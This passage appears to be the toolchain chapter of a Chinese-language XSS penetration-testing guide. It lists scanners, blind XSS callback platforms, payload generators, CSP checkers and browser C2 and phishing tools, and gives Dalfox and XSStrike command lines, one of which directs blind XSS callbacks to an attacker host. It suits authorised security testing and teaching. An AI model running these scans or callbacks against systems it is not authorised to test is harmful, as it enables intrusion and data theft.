## 十三、工具链

### 13.1 扫描与检测工具
| 工具 | 用途 | 备注 |
|------|------|------|
| Burp Suite Pro | 主动扫描+手动验证 | Active Scan含XSS审计 |
| Burp DOM Invader | DOM XSS检测 | 自动标记source/sink、postMessage劫持、canary注入 |
| Burp Hackvertor | 编码标签化构造 | 见第三章编码矩阵 |
| Dalfox | 快速XSS扫描器 | 参数分析+WAF绕过+Blind XSS |
| XSStrike | XSS扫描+WAF绕过引擎 | Python，探测+payload生成 |
| wfuzz / ffuf | Fuzz XSS payload与参数 | 配合自建字典 |
| Retire.js | 老旧易受攻击JS库检测 | 浏览器扩展 |
| nuclei | 模板化漏洞扫描 | XSS模板丰富 |
| ZAP | 开源DAST | 社区方案 |

### 13.2 Blind XSS平台
- XSS Hunter Express: https://github.com/mandatoryprogrammer/xsshunter-express（自托管，支持多上下文payload）
- ezXSS: https://github.com/ssl/ezXSS
- 商业：Intigriti / HackerOne 自带XSS回连监控
- 自建：VPS + 简单HTTP接收端记录`?c=`参数

### 13.3 编码与Payload生成
- Hackvertor（Burp扩展）：嵌套编码标签
- PayloadsAllTheThings / SecLists XSS字典
- **XSSGAI**（AI生成器）: https://github.com/AnonKryptiQuz/XSSGAI
- **GenXSS**（LLM框架）: https://arxiv.org/abs/2504.08176
- 在线验证：https://jsfiddle.net / local jsdom + headless Chrome 批量验证
- clobbering/原型污染payload参考：https://github.com/yesmeck/jquery-xss-tests

### 13.4 CSP分析工具
- https://csp-evaluator.withgoogle.com/（Google官方策略评估）
- https://cspbypass.com/
- Burp CSP Auditor
- 浏览器DevTools：Network响应头直接审查CSP

### 13.5 后渗透与C2
- BeEF: `beef-xss`（hook.js即浏览器C2）
- Metasploit: `browser_autopwn`（浏览器漏洞利用）
- Social-Engineer Toolkit（钓鱼配合）
- Interactsh（DNS/HTTP外带回连，配合Blind XSS验证）

### 13.6 Dalfox高级用法
```bash
# 基础扫描
dalfox url "http://target.com/page?q=test"

# 深度扫描+Blind XSS
dalfox url "http://target/page?q=test" --blind https://attacker.xss.ht --remote-payloads portswigger,payloadbox

# POST请求扫描
dalfox url "http://target/login" -X POST -d "username=test&password=test"

# 自定义Payload + WAF绕过 + 无头检测
dalfox url "http://target/page?q=test" --custom-payload payloads.txt --waf-evasion --headless

# 忽略证书+代理+多参数
dalfox url "http://target/page" --proxy http://127.0.0.1:8080 --follow-redirects -F
```

### 13.7 XSStrike使用
```bash
# 基础扫描 / POST扫描 / 爬行+扫描 / 盲打XSS
python xsstrike.py -u "http://target.com/page?q=test"
python xsstrike.py -u "http://target/page" --data "q=test"
python xsstrike.py -u "http://target.com" --crawl
python xsstrike.py -u "http://target/page?q=test" --blind
```

